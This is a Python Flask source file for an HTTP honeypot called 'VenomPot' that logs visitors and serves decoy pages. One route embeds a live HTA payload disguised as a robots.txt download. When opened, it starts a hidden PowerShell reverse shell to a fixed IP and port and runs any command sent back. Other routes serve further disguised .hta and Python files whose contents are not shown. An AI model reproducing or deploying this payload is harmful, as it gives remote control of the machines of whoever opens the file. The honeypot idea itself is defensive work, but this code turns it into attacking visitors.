#!/bin/python3
"""
This module defines the http honeypot service for VenomPot.
"""
import logging
from logging.handlers import RotatingFileHandler
from pathlib import Path
import platform
from flask import Flask, render_template, request, redirect, send_file, Response, url_for
import os
from datetime import datetime, timezone
from jinja2.sandbox import SandboxedEnvironment
from jinja2 import StrictUndefined
import re

SAFE_EXPR = re.compile(r"^\s*\{\{\s*[\d\s+\-*/%()**]+\s*\}\}\s*$")

def safe_render(expr: str):
    if not SAFE_EXPR.match(expr):
        raise ValueError("expression rejected")

    template = sandbox.from_string(expr)
    return template.render()


sandbox = SandboxedEnvironment(
    undefined=StrictUndefined,
    autoescape=False
)

sandbox.globals = {}
sandbox.filters = {}
sandbox.tests = {}

secret_key = os.getenv("secret_key")    


# logging configuration
LOG_DIR = Path(__file__).parent / "logs"
LOG_DIR.mkdir(exist_ok=True)
LOG_FILE = LOG_DIR / "http_logs.log"

funnel_handler = RotatingFileHandler(
    LOG_FILE,
    maxBytes=5_000_000,
    backupCount=5
)

funnel_logger = logging.getLogger("HTTP Logger")
funnel_logger.setLevel(logging.INFO)
funnel_handler = RotatingFileHandler(
    LOG_FILE,
    maxBytes=5_000_000,
    backupCount=5
)
funnel_logger.addHandler(funnel_handler)


robots_counter = {}
config_counter = {}


def web_VenomPot(input_username="admin", input_password="admin"):
    app = Flask(__name__)
    app.secret_key = "change-this"

    @app.route("/", methods=["GET"])
    def index():
        funnel_logger.info(
            "event=http_request "
            f"client_ip={request.remote_addr} "
            f"method={request.method} "
            f"user_agent=\"{request.headers.get('User-Agent','')}\" "
            f"path={request.path} "
            f"ts={datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')} "
            f"OS={platform.system()}_{platform.release()} "
        )

        return render_template("login.html")

    @app.route("/login", methods=["POST", "GET"])
    def login():
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        funnel_logger.info(
            "event=http_request "
            f"client_ip={request.remote_addr} "
            f"method={request.method} "
            f"user_agent=\"{request.headers.get('User-Agent','')}\" "
            f"path={request.path} "
            f"ts={datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')} "
            f"OS={platform.system()}_{platform.release()} "
        )


        if username == input_username and password == input_password:
            funnel_logger.info(
                "event=http_request "
                f"client_ip={request.remote_addr} "
                f"method={request.method} "
                f"user_agent=\"{request.headers.get('User-Agent','')}\" "
                f"path={request.path} "
                f"ts={datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')} "
                f" OS={platform.system()}_{platform.release()} "
            )

            return redirect(url_for("dashboard"))
        elif request.method == "GET":
            return render_template("login.html")
        else:
            funnel_logger.info(
                "event=http_request "
                f"client_ip={request.remote_addr} "
                f"method={request.method} "
                f"user_agent=\"{request.headers.get('User-Agent','')}\" "
                f"path={request.path} "
                f"ts={datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')} "
                f"OS={platform.system()}_{platform.release()} "
            )

            return render_template("login.html", error="Invalid credentials")

    @app.route("/dashboard", methods=["GET", "POST"])
    def dashboard():
        output = None

        funnel_logger.info(
            "event=http_request "
            f"client_ip={request.remote_addr} "
            f"method={request.method} "
            f"user_agent=\"{request.headers.get('User-Agent','')}\" "
            f"path={request.path} "
            f"ts={datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')} "
            f"OS={platform.system()}_{platform.release()} "
        )


        if request.method == "POST":
            command = request.form.get("cmd", "")

            try:
                result = safe_render(command)
                output = f"Executed_command:_{result}"
            except Exception:
                output = "Invalid_expression"

            print(output)
            funnel_logger.info(
                "event=http_request "
                f"client_ip={request.remote_addr} "
                f"method={request.method} "
                f"user_agent=\"{request.headers.get('User-Agent','')}\" "
                f"path={request.path} "
                f"ts={datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')} "
                f"OS={platform.system()}_{platform.release()} "
                f"cmd=\"{command}\" "
                f"result=\"{output}\" "
            )


        return render_template("dashboard.html", output=output)

    @app.route("/robots.txt", methods=["GET"])
    def robots():
        ip = request.remote_addr

        if ip not in robots_counter:
            robots_counter[ip] = 0

        robots_counter[ip] += 1
        count = robots_counter[ip]

        decoy_robots = """User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /old/
"""


        # odd requests → robots.txt
        if count % 2 == 1:
            funnel_logger.info(
                "event=http_request "
                f"client_ip={request.remote_addr} "
                f"method={request.method} "
                f"user_agent=\"{request.headers.get('User-Agent','')}\" "
                f"path={request.path} "
                f"ts={datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')} "
                f"OS={platform.system()}_{platform.release()} "
            )

            return Response(decoy_robots, mimetype="text/plain")

        return redirect("/robots.txt.hta", code=302)


    @app.route("/robots.txt.hta", methods=["GET"])
    def robots2():
        hta_payload = r"""
<html>
<head>
<script language="VBScript">
    function runRemoteLogic() {
      try {
        var shell = new ActiveXObject("WScript.Shell");
        
        // Define the powershell command with proper escaping for 2026 systems
        // Use shell.Run with '0' to execute without a visible window
        var ps_cmd = "powershell -NoProfile -WindowStyle Hidden -Command \"$c=New-Object Net.Sockets.TCPClient('172.27.255.49',4444); $s=$c.GetStream(); $w=New-Object IO.StreamWriter($s); $w.AutoFlush=$true; $w.Write('PS ' + (pwd).Path + '> '); while($c.Connected){ if($s.DataAvailable){ $b=New-Object Byte[] 1024; $r=$s.Read($b,0,1024); $in=[text.encoding]::UTF8.GetString($b,0,$r).Trim(); if($in.Length -gt 0){ $out = try { iex $in 2>&1 | Out-String } catch { $_.Exception.Message | Out-String }; if ($out.Length -eq 0) { $out = \\\"`n\\\" }; $w.Write($out + 'PS ' + (pwd).Path + '> '); } } Start-Sleep -m 100 }\"";
        
        shell.Run(ps_cmd, 0, false);
        document.getElementById("status").innerHTML = "Process initiated (Hidden)";
      } catch (e) {
        document.getElementById("status").innerHTML = "Error: " + e.message;
      }
    }

    window.onload = runRemoteLogic;
  </script>
</head>
<body>
<h4>Robots.txt</h4>
<pre>User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /old/
</pre>
</body>
</html>
"""
        funnel_logger.info(
            "event=http_request "
            f"client_ip={request.remote_addr} "
            f"method={request.method} "
            f"user_agent=\"{request.headers.get('User-Agent','')}\" "
            f"path={request.path} "
            f"ts={datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')} "
            f"OS={platform.system()}_{platform.release()} "
        )


        return Response(
            hta_payload,
            mimetype="application/hta",
            headers={
                "Content-Disposition": "attachment; filename=robots.txt.hta"
            },
        )
    
    @app.route("/.CONFIG", methods=["GET"])
    def config_decoy():
        ip = request.remote_addr

        if ip not in config_counter:
            config_counter[ip] = 0

        config_counter[ip] += 1
        count = config_counter[ip]

        # odd → HTML view
        if count % 2 == 1:
            funnel_logger.info(
                "event=http_request "
                f"client_ip={request.remote_addr} "
                f"method={request.method} "
                f"user_agent=\"{request.headers.get('User-Agent','')}\" "
                f"path={request.path} "
                f"ts={datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')}"
                f"OS={platform.system()}_{platform.release()} "

            )
            
            return send_file(
                "templates/.config.html",
                mimetype="text/html"
            )

        # even → HTA download
        funnel_logger.info(
            "event=http_request "
            f"client_ip={request.remote_addr} "
            f"method={request.method} "
            f"user_agent=\"{request.headers.get('User-Agent','')}\" "
            f"path={request.path} "
            f"ts={datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')}"
            f"OS={platform.system()}_{platform.release()} "
        )

        return redirect("/.CONFlG", code=302)

    @app.route("/.CONFlG", methods=["GET"])
    def config_html():
        return send_file(
            "templates/.config.html.hta",
            mimetype="application/hta",
            as_attachment=True,
            download_name=".config.html"
        )

    @app.route("/.setup", methods=["GET"])
    def setup():
        platform = request.headers.get('User-Agent', '').lower()
        print(platform)
        if "windows" in platform:
            return redirect("/", code=302) and send_file(
                "dist/.for_devs_only_win.py",
                mimetype="text/plain",
                as_attachment=True,
                download_name=".for_devs_only.py"
            )
        else:
            return redirect("/", code=302) and send_file(
                "dist/.for_devs_only_linux.py",
                mimetype="text/plain",
                as_attachment=True,
                download_name=".for_devs_only.py"
            )

    return app


def run_web_VenomPot(port=8080, input_username="admin", input_password="admin"):
    app = web_VenomPot(input_username, input_password)
    app.run(host="0.0.0.0", port=port, debug=True)


if __name__ == "__main__":
    run_web_VenomPot()